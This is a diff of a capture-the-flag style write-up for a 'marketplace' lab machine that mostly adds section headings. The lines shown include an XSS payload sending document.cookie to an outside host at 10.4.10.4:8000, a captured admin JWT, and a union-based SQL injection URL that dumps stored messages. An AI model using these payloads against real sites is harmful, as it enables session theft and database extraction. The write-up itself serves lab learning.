@@ -30,20 +30,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Found xss vulnerability in both of text box
 
-running python3 simple http server
+## running python3 simple http server
 
 ``` <script>var i=new Image; i.src="http://10.4.10.4:8000/?"+document.cookie;</script>```
 
 admin token = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDgwMjk3ODN9.vJ9-d2NiJld0S3a5Am7DNkxYuD-ubW_QWg0v1lX5t6g
 
 
-Sql Injection
+## Sql Injection
 
 looks like admin panel have sql vulnerability for cross check put" ' " at the end of the url
 
 now we can inject some sql code to access the database also we can try union based sqli attack to read content from the database
 
 /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
+
+## Enumeration
 
 and found the username and the ssh password
 
